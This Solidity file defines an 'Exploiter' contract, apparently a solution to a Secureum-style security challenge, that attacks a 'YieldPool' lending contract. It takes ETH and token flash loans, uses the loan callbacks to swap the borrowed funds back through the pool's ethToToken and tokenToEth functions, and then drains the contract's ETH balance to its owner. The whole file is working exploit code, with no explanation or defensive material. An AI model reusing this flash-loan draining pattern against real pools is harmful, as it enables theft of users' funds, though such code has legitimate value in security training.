// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {IERC20, ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC3156FlashLender, IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "./YieldPool.sol";

contract Exploiter is IERC3156FlashBorrower
{
    address owner;
    YieldPool pool;
    IERC20 secureumToken;
    bool lastAttackWasETH = false;

    constructor(address target) payable
    {
        pool = YieldPool(payable(target));
        secureumToken = pool.TOKEN();
        owner = msg.sender;
    }

    function attackETH() external payable
    {
        // Get a loan in ETH.
        lastAttackWasETH = true;
        pool.flashLoan(this, pool.ETH(), address(this).balance * 100, "");
    }

    function attackToken() external payable
    {
        // Get a loan in tokens.
        lastAttackWasETH = false;
        pool.flashLoan(this, address(secureumToken), secureumToken.balanceOf(address(this)) * 100, "");
    }

    function drain() external
    {
        //Withdraw all our money at the end
        owner.call{value: address(this).balance}("");
    }

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32)
    {
        //Check if we get a token flashloan or its just the call from the eth loan
        if (!lastAttackWasETH)
        {
            secureumToken.approve(address(pool), secureumToken.balanceOf(address(this)));
            pool.tokenToEth(secureumToken.balanceOf(address(this)));
        }

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {
        //We get a eth flashloan
        if (lastAttackWasETH)
        {
            pool.ethToToken{value: address(this).balance}();
        }
    }
}